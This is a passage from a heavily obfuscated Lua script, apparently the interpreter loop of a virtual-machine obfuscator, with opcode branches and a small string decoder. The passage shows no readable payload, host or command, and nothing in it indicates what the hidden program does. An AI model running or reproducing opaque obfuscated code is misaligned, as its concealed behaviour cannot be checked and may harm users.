J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]]=H[E[C]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[14]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[42]];elseif(J<117)then A=A+1;E=l[A];local J=E[D];local I=H[E[C]];H[J+1]=I;H[J]=I[B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[6]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[67]];end;elseif(J<=118)then A=A+1;E=l[A];local I=E[D];local J=H[6];H[I+1]=J;H[I]=J[B[111]];A=A+1;E=l[A];H[8]=B[E[C]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]]=H[E[C]][B[20]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];elseif(J>119)then H[E[D]]=H[E[C]]-H[E[F]];elseif(J<120)then A=A+1;E=l[A];H=({});for A=0,U do if(A<G)then H[A]=K[A+1];else break end;end;A=A+1;E=l[A];H[0]=I[B[E[C]]];A=A+1;E=l[A];H[E[D]]=(not(H[E[C]]));A=A+1;E=l[A];I[B[5]]=H[E[D]];A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];end;elseif(J<=123)then if(J<=121)then A=A+1;E=l[A];H[E[D]]=H[E[C]];A=A+1;E=l[A];local F=E[D];H[F]=H[F](H[F+1]);A=A+1;E=l[A];local J=E[D];local F=H[E[C]];H[J+1]=F;H[J]=F[B[21]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local A=E[D];H[A]=H[A](L(H,A+1,E[C]));elseif(J==122)then A=E[C];elseif(J<=123)then local D,l=({}),(B[E[D]]);local H=("");local A=(#l/2);for E=1,A,1 do D[X(W(l,A+E,A+E))]=a[N(X(W(l,E,E)),219)];end;for A=1,A,1 do H=H..D[A];end;B[E[C]]=H;c=c+1;end;elseif(J<=124)then H[E[D]]=H[E[C]]*H[E[F]];elseif(J==125)then A=A+1;E=l[A];H[E[D]]=B[51];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];H[E[D]]=B[51];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]][B[17]]=H[E[F]];elseif(J<=126)then A=A+1;E=l[A];H[E[D]]=I[B[26]];A=A+1;E=l[A];H[E[D]]=H[4][B[20]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[20]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](H[J+1]);A=A+1;E=l[A];H[9]=B[28];A=A+1;E=l[A];local J=E[C];local B=H[J];for A=J+1,E[F]do B=B..H[A];end;H[E[D]]=B;A=A+1;E=l[A];H[E[D]]=H[E[C]];A=A+1;E=l[A];local A=E[D];H[A](L(H,A+1,E[C]));end;elseif(J<=132)then if(J<=129)then if(J<=127)then A=A+1;E=l[A];H[E[D]]=I[B[94]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];H[7]=O[E[C]];A=A+1;E=l[A];local C=E[C];local B=H[C];for A=C+1,E[F]do B=B..H[A];end;H[E[D]]=B;A=A+1;E=l[A];local D=E[D];H[D](H[D+1]);A=A+1;E=l[A];do return;end;elseif(J>128)then A=A+1;E=l[A];local I=E[D];local J=H[0];H[I+1]=J;H[I]=J[B[4]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]]=H[0][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[0][B[18]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[48]];elseif(J<129)then A=A+1;E=l[A];H=({});for A=0,U do if(A<G)then H[A]=K[A+1];else break end;end;A=A+1;E=l[A];H[1]=I[B[E[C]]];A=A+1;E=l[A];H[E[D]]=H[E[C]];A=A+1;E=l[A];local F=E[D];H[F](H[F+1]);A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];end;elseif(J<=130)then do return;end;elseif(J==131)then A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];local J=E[D];local I=H[E[C]];H[J+1]=I;H[J]=I[B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];local J=E[D];local C=H[E[C]];H[J+1]=C;H[J]=C[B[36]];A=A+1;E=l[A];local B=E[D];local J,C=Y(H[B](H[B+1]));V=C+B-1;local C=0;for A=B,V do C=C+1;H[A]=J[C];end;A=A+1;E=l[A];local l=E[D];local D={H[l](L(H,l+1,V));};local A=0;for E=l,E[F]do A=A+1;H[E]=D[A];end;elseif(J<=132)then A=A+1;E=l[A];H=({});for A=0,U do if(A<G)then H[A]=K[A+1];else break end;end;A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];local J=E[D];local I=H[E[C]];H[J+1]=I;H[J]=I[B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local A=E[D];H[A](L(H,A+1,E[C]));end;elseif(J<=135)then if(J<=133)then local A=E[D];H[A](L(H,A+1,V));elseif(J>134)then A=A+1;E=l[A];H[E[D]]=H[7]/B[E[F]];A=A+1;E=l[A];H[E[D]]=I[B[39]];A=A+1;E=l[A];H[E[D]]=H[11][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[11][B[E[F]]];A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[34]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[88]];A=A+1;E=l[A];H[E[D]]=B[23];A=A+1;E=l[A];H[E[D]]=(E[C]~=0);A=A+1;E=l[A];H[E[D]]=B[23];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]]=H[E[C]];A=A+1;E=l[A];H[E[D]]=O[E[C]];A=A+1;E=l[A];local V=E[D];local J=H[E[C]];H[V+1]=J;H[V]=J[B[44]];A=A+1;E=l[A];H[E[D]]=H[E[C]];A=A+1;E=l[A];H[E[D]]=H[5];A=A+1;E=l[A];H[E[D]]=H[E[C]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]]=H[E[C]];A=A+1;E=l[A];local J=E[D];local L=H[E[C]];H[J+1]=L;H[J]=L[B[E[F]]];A=A+1;E=l[A];local F=E[D];H[F](H[F+1]);A=A+1;E=l[A];H[E[D]]=H[E[C]][B[40]];A=A+1;E=l[A];local F=E[D];local J=H[E[C]];H[F+1]=J;H[F]=J[B[7]];A=A+1;E=l[A];local F=E[D];H[F](H[F+1]);A=A+1;E=l[A];H[E[D]]=(E[C]~=0);A=A+1;E=l[A];I[B[E[C]]]=H[E[D]];A=A+1;E=l[A];do return;end;elseif(J<135)then A=A+1;E=l[A];local J=E[D];local I=H[E[C]];H[J+1]=I;H[J]=I[B[E[F]]];A=A+1;E=l[A];H[6]=B[68];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]]=H[4][B[E[F]]];A=A+1;E=l[A];H[4]=H[4][B[23]];A=A+1;E=l[A];H[4]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];end;elseif(J<=136)then local A=E[D];H[A]=H[A](H[A+1]);elseif(J>137)then A=A+1;E=l[A];local B=E[D];local l={};for A=1,#Q,1 do local A=Q[A];for E=0,#A,1 do local E=A[E];local D=E[1];local A=E[2];if((D==H)and(A>=B))then l[A]=D[A];E[1]=l;end;end;end;elseif(J<138)then if(H[E[D]])then A=A+1;else A=E[C];end;end;elseif(J<=161)then if(J<=149)then if(J<=143)then if(J<=140)then if(J==139)then A=A+1;E=l[A];local J=E[D];local I=H[E[C]];H[J+1]=I;H[J]=I[B[18]];A=A+1;E=l[A];H[3]=B[9];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]]=H[E[C]][B[47]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];local J=E[D];local F=H[E[C]];H[J+1]=F;H[J]=F[B[3]];A=A+1;E=l[A];H[E[D]]=B[8];A=A+1;E=l[A];local A=E[D];H[A]=H[A](L(H,A+1,E[C]));elseif(J<=140)then A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];local J=E[D];local C=H[E[C]];H[J+1]=C;H[J]=C[B[E[F]]];A=A+1;E=l[A];local B=E[D];local J,C=Y(H[B](H[B+1]));V=C+B-1;local C=0;for A=B,V do C=C+1;H[A]=J[C];end;A=A+1;E=l[A];local l=E[D];local D={H[l](L(H,l+1,V));};local A=0;for E=l,E[F]do A=A+1;H[E]=D[A];end;end;elseif(J<=141)then H[E[D]][B[E[C]]]=B[E[F]];elseif(J>142)then A=A+1;E=l[A];H[7]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];H[E[D]]=B[86];A=A+1;E=l[A];H[E[D]]=B[86];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]][B[E[C]]]=H[E[F]];A=A+1;E=l[A];H[E[D]]=I[B[115]];A=A+1;E=l[A];H[E[D]]=H[7][B[E[F]]];A=A+1;E=l[A];H[8]=B[86];A=A+1;E=l[A];H[9]=B[E[C]];A=A+1;E=l[A];H[E[D]]=B[99];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[6][B[114]]=H[7];A=A+1;E=l[A];H[E[D]][B[109]]=B[61];A=A+1;E=l[A];H[E[D]][B[E[C]]]=B[E[F]];A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];elseif(J<143)then A=A+1;E=l[A];H[1]=I[B[10]];A=A+1;E=l[A];local I=E[D];local J=H[E[C]];H[I+1]=J;H[I]=J[B[24]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[1]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[30]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[16]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[13]];A=A+1;E=l[A];H[1]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[26]];A=A+1;E=l[A];local J=E[D];local C=H[E[C]];H[J+1]=C;H[J]=C[B[21]];A=A+1;E=l[A];local B=E[D];local J,C=Y(H[B](H[B+1]));V=C+B-1;local C=0;for A=B,V do C=C+1;H[A]=J[C];end;A=A+1;E=l[A];local l=E[D];local D={H[l](L(H,l+1,V));};local A=0;for E=l,E[F]do A=A+1;H[E]=D[A];end;end;elseif(J<=146)then if(J<=144)then H[E[D]]=H[E[C]]*B[E[F]];elseif(J==145)then A=A+1;E=l[A];H[2]=B[E[C]];A=A+1;E=l[A];H[E[D]]=H[E[C]];A=A+1;E=l[A];local C=E[C];local B=H[C];for A=C+1,E[F]do B=B..H[A];end;H[E[D]]=B;A=A+1;E=l[A];local D=E[D];H[D](H[D+1]);A=A+1;E=l[A];do return;end;elseif(J<=146)then A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];H[3]=I[B[E[C]]];A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](H[J+1]);A=A+1;E=l[A];local L=E[C];local J=H[L];for A=L+1,E[F]do J=J..H[A];end;H[E[D]]=J;A=A+1;E=l[A];local F=E[D];H[F](H[F+1]);A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];H[E[D]]=H[1][B[3]];end;elseif(J<=147)then A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];H[E[D]]=H[E[C]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]]=I[B[10]];A=A+1;E=l[A];H[2]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[9];A=A+1;E=l[A];H[4]=H[E[C]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]][B[E[C]]]=B[50];A=A+1;E=l[A];H[E[D]]=I[B[34]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[74]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];H[E[D]]=B[50];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]][B[E[C]]]=H[3];A=A+1;E=l[A];H[E[D]]=H[0][B[78]];A=A+1;E=l[A];H[E[D]][B[E[C]]]=H[E[F]];A=A+1;E=l[A];H[E[D]]=I[B[34]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[4]=B[E[C]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];H[E[D]]=B[50];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]][B[86]]=H[E[F]];A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];H[3]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];H[E[D]]=B[51];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]][B[17]]=H[E[F]];elseif(J>148)then A=A+1;E=l[A];H[4]=I[B[26]];A=A+1;E=l[A];local A=E[D];H[A](L(H,A+1,E[C]));elseif(J<149)then A=A+1;E=l[A];local V=E[D];local J=H[E[C]];H[V+1]=J;H[V]=J[B[0]];A=A+1;E=l[A];H[E[D]]=B[3];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[1]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[1]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[1][B[E[C]]]=B[E[F]];A=A+1;E=l[A];H[E[D]]=I[B[5]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[1]=H[1][B[12]];A=A+1;E=l[A];H[1]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[22]];A=A+1;E=l[A];H[E[D]][B[6]]=B[E[F]];A=A+1;E=l[A];H[1]=I[B[5]];A=A+1;E=l[A];local J=E[D];local I=H[E[C]];H[J+1]=I;H[J]=I[B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[3];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]]=H[E[C]][B[14]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[12]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[2]];A=A+1;E=l[A];H[1][B[17]]=B[E[F]];end;elseif(J<=155)then if(J<=152)then if(J<=150)then A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];local J=E[D];local I=H[E[C]];H[J+1]=I;H[J]=I[B[E[F]]];A=A+1;E=l[A];H[2]=B[E[C]];A=A+1;E=l[A];local A=E[D];H[A]=H[A](L(H,A+1,E[C]));elseif(J>151)then A=A+1;E=l[A];H=({});for A=0,U do if(A<G)then H[A]=K[A+1];else break end;end;A=A+1;E=l[A];I[B[11]]=H[E[D]];A=A+1;E=l[A];H[1]=I[B[E[C]]];A=A+1;E=l[A];H[E[D]]=I[B[24]];A=A+1;E=l[A];local I=E[D];local J=H[E[C]];H[I+1]=J;H[I]=J[B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[12];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];local J=E[D];local C=H[E[C]];H[J+1]=C;H[J]=C[B[E[F]]];A=A+1;E=l[A];local B=E[D];local J,C=Y(H[B](H[B+1]));V=C+B-1;local C=0;for A=B,V do C=C+1;H[A]=J[C];end;A=A+1;E=l[A];local A=E[D];local D={H[A](L(H,A+1,V));};local l=0;for A=A,E[F]do l=l+1;H[A]=D[l];end;elseif(J<152)then local A=E[D];local l,E=Y(H[A](H[A+1]));V=E+A-1;local E=0;for A=A,V do E=E+1;H[A]=l[E];end;end;elseif(J<=153)then local A=E[D];H[A]=H[A](L(H,A+1,E[C]));elseif(J==154)then A=A+1;E=l[A];H[E[D]]=H[E[C]][B[69]];A=A+1;E=l[A];H[5]=H[E[C]][B[102]];A=A+1;E=l[A];local F=E[D];local C=H[E[C]];H[F+1]=C;H[F]=C[B[50]];A=A+1;E=l[A];local A=E[D];H[A](H[A+1]);elseif(J<=155)then end;elseif(J<=158)then if(J<=156)then A=A+1;E=l[A];H=({});for A=0,U do if(A<G)then H[A]=K[A+1];else break end;end;A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];H[E[D]]=O[E[C]];A=A+1;E=l[A];local I=E[D];local J=H[E[C]];H[I+1]=J;H[I]=J[B[E[F]]];A=A+1;E=l[A];H[E[D]]=O[E[C]];A=A+1;E=l[A];local B=E[D];local F,C=Y(H[B](L(H,B+1,E[C])));V=C+B-1;local C=0;for A=B,V do C=C+1;H[A]=F[C];end;A=A+1;E=l[A];local A=E[D];H[A](L(H,A+1,V));elseif(J==157)then A=A+1;E=l[A];H[E[D]]=B[12];A=A+1;E=l[A];H[E[D]]=H[E[C]];A=A+1;E=l[A];local C=E[C];local B=H[C];for A=C+1,E[F]do B=B..H[A];end;H[E[D]]=B;A=A+1;E=l[A];local D=E[D];H[D](H[D+1]);A=A+1;E=l[A];do return;end;elseif(J<=158)then A=A+1;E=l[A];local F=E[D];local J=H[E[C]];H[F+1]=J;H[F]=J[B[1]];A=A+1;E=l[A];H[6]=B[E[C]];A=A+1;E=l[A];local F=E[D];H[F]=H[F](L(H,F+1,E[C]));A=A+1;E=l[A];H[E[D]]=H[E[C]][B[43]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[23]];A=A+1;E=l[A];local F=E[D];local J=H[E[C]];H[F+1]=J;H[F]=J[B[82]];A=A+1;E=l[A];H[E[D]]=B[40];A=A+1;E=l[A];local A=E[D];H[A]=H[A](L(H,A+1,E[C]));end;elseif(J<=159)then A=A+1;E=l[A];H=({});for A=0,U do if(A<G)then H[A]=K[A+1];else break end;end;A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];H[2]=O[E[C]];A=A+1;E=l[A];local N=E[D];local J=H[2];H[N+1]=J;H[N]=J[B[E[F]]];A=A+1;E=l[A];H[4]=I[B[0]];A=A+1;E=l[A];local B=E[D];local F,C=Y(H[B](L(H,B+1,E[C])));V=C+B-1;local C=0;for A=B,V do C=C+1;H[A]=F[C];end;A=A+1;E=l[A];local A=E[D];H[A](L(H,A+1,V));elseif(J==160)then A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[15]=H[E[C]][B[91]];A=A+1;E=l[A];local F=E[D];local J=H[E[C]];H[F+1]=J;H[F]=J[B[76]];A=A+1;E=l[A];local F=E[D];H[F]=H[F](H[F+1]);A=A+1;E=l[A];local F=E[D];local C=H[E[C]];H[F+1]=C;H[F]=C[B[76]];A=A+1;E=l[A];local B=E[D];local F,C=Y(H[B](H[B+1]));V=C+B-1;local C=0;for A=B,V do C=C+1;H[A]=F[C];end;A=A+1;E=l[A];local A=E[D];H[A]=H[A](L(H,A+1,V));elseif(J<=161)then A=A+1;E=l[A];I[B[1]]=H[1];A=A+1;E=l[A];H[1]=I[B[E[C]]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];local B=E[D];H[B]=H[B](H[B+1]);A=A+1;E=l[A];local C=E[C];local B=H[C];for A=C+1,E[F]do B=B..H[A];end;H[E[D]]=B;A=A+1;E=l[A];local A=E[D];H[A](H[A+1]);end;elseif(J<=173)then if(J<=167)then if(J<=164)then if(J<=162)then A=A+1;E=l[A];H=({});for A=0,U do if(A<G)then H[A]=K[A+1];else break end;end;A=A+1;E=l[A];H[E[D]]=H[E[C]]-H[E[F]];A=A+1;E=l[A];H[2]=H[E[C]][B[0]];A=A+1;E=l[A];do return(H[2]);end;elseif(J>163)then A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[11]=H[E[C]][B[E[F]]];A=A+1;E=l[A];local F=E[D];local J=H[E[C]];H[F+1]=J;H[F]=J[B[82]];A=A+1;E=l[A];local B=E[D];H[B]=H[B](H[B+1]);A=A+1;E=l[A];H[12]=O[E[C]];A=A+1;E=l[A];local A=E[D];H[A]=H[A](L(H,A+1,E[C]));elseif(J<164)then A=A+1;E=l[A];H[3]=B[E[C]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[1]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[1][B[8]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[1][B[13]];A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];H[E[D]]=B[1];A=A+1;E=l[A];local A=E[D];H[A](L(H,A+1,E[C]));end;elseif(J<=165)then if(not(H[E[D]]))then A=A+1;else A=E[C];end;elseif(J>166)then A=A+1;E=l[A];H=({});for A=0,U do if(A<G)then H[A]=K[A+1];else break end;end;A=A+1;E=l[A];O[E[C]]=H[1];A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];H[E[D]]=I[B[31]];A=A+1;E=l[A];local I=E[D];local J=H[2];H[I+1]=J;H[I]=J[B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];local J=E[D];local C=H[E[C]];H[J+1]=C;H[J]=C[B[8]];A=A+1;E=l[A];local B=E[D];local J,C=Y(H[B](H[B+1]));V=C+B-1;local C=0;for A=B,V do C=C+1;H[A]=J[C];end;A=A+1;E=l[A];local l=E[D];local D={H[l](L(H,l+1,V));};local A=0;for E=l,E[F]do A=A+1;H[E]=D[A];end;elseif(J<167)then H=({});for A=0,U do if(A<G)then H[A]=K[A+1];else break end;end;end;elseif(J<=170)then if(J<=168)then H[E[D]]=(E[C]~=0);elseif(J==169)then A=A+1;E=l[A];H[15]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[16]=H[E[C]][B[42]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[29]];A=A+1;E=l[A];local A=E[D];H[A]=H[A](L(H,A+1,E[C]));elseif(J<=170)then A=A+1;E=l[A];local J=E[D];H[J]=H[J]();A=A+1;E=l[A];H[E[D]][B[E[C]]]=B[E[F]];end;elseif(J<=171)then A=A+1;E=l[A];H[0]=H[E[C]][B[11]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[13]];A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[16]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[11]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=I[B[5]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[2]=H[2][B[11]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[15]];A=A+1;E=l[A];H[2]=H[E[C]][B[4]];A=A+1;E=l[A];H[E[D]]=H[E[C]]/H[E[F]];A=A+1;E=l[A];H[E[D]]=H[E[C]]+H[E[F]];A=A+1;E=l[A];I[B[14]]=H[E[D]];elseif(J==172)then A=A+1;E=l[A];I[B[361]]=H[E[D]];A=A+1;E=l[A];H[E[D]]=I[B[379]];A=A+1;E=l[A];H[3]=B[E[C]];A=A+1;E=l[A];H[4]=I[B[E[C]]];A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];local B=E[D];H[B]=H[B](H[B+1]);A=A+1;E=l[A];local C=E[C];local B=H[C];for A=C+1,E[F]do B=B..H[A];end;H[E[D]]=B;A=A+1;E=l[A];local A=E[D];H[A](H[A+1]);elseif(J<=173)then do return(H[E[D]]);end;end;elseif(J<=179)then if(J<=176)then if(J<=174)then A=A+1;E=l[A];H=({});for A=0,U do if(A<G)then H[A]=K[A+1];else break end;end;A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];local J=E[D];local V=H[E[C]];H[J+1]=V;H[J]=V[B[5]];A=A+1;E=l[A];H[E[D]]=B[24];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]]=H[E[C]][B[16]];A=A+1;E=l[A];H[E[D]]=H[0][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[0][B[E[F]]];A=A+1;E=l[A];H[E[D]][B[12]]=B[2];A=A+1;E=l[A];H[E[D]]=I[B[E[C]]];A=A+1;E=l[A];H[E[D]]=H[0][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[0]=H[0][B[23]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]][B[E[C]]]=B[E[F]];A=A+1;E=l[A];H[0]=I[B[E[C]]];A=A+1;E=l[A];local J=E[D];local V=H[E[C]];H[J+1]=V;H[J]=V[B[5]];A=A+1;E=l[A];H[2]=B[E[C]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]]=H[E[C]][B[16]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[3]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]][B[12]]=B[8];A=A+1;E=l[A];H[0]=I[B[E[C]]];A=A+1;E=l[A];H[0]=H[0][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[3]];A=A+1;E=l[A];H[E[D]]=H[E[C]][B[18]];A=A+1;E=l[A];local F=E[D];local J=H[0];H[F+1]=J;H[F]=J[B[10]];A=A+1;E=l[A];H[E[D]]=R(Z[E[C]],(nil),I);A=A+1;E=l[A];local A=E[D];H[A]=H[A](L(H,A+1,E[C]));elseif(J==175)then A=A+1;E=l[A];H=({});for A=0,U do if(A<G)then H[A]=K[A+1];else break end;end;A=A+1;E=l[A];I[B[14]]=H[1];A=A+1;E=l[A];H[E[D]]=I[B[17]];A=A+1;E=l[A];H[2]=I[B[E[C]]];A=A+1;E=l[A];local J=E[D];local I=H[2];H[J+1]=I;H[J]=I[B[28]];A=A+1;E=l[A];H[E[D]]=B[8];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];local J=E[D];local C=H[E[C]];H[J+1]=C;H[J]=C[B[E[F]]];A=A+1;E=l[A];local B=E[D];local J,C=Y(H[B](H[B+1]));V=C+B-1;local C=0;for A=B,V do C=C+1;H[A]=J[C];end;A=A+1;E=l[A];local A=E[D];local D={H[A](L(H,A+1,V));};local l=0;for A=A,E[F]do l=l+1;H[A]=D[l];end;elseif(J<=176)then H[E[D]]=R(Z[E[C]],(nil),I);end;elseif(J<=177)then A=A+1;E=l[A];local I=E[D];local J=H[E[C]];H[I+1]=J;H[I]=J[B[E[F]]];A=A+1;E=l[A];H[E[D]]=B[E[C]];A=A+1;E=l[A];local J=E[D];H[J]=H[J](L(H,J+1,E[C]));A=A+1;E=l[A];H[E[D]]=H[E[C]][B[E[F]]];A=A+1;E=l[A];H[E[D]]=H[0][B[E[F]]];A=A+1;E=l[A];local F=E[D];local J=H[0];H[F+1]=J;H[F]=J[B[6]];A=A+1;E=l[A];H[E[D]]=B[10];A=A+1;E=l[A];local A=E[D];H[A]=H[A](L(H,A+1,E[C]));elseif(J>178)then 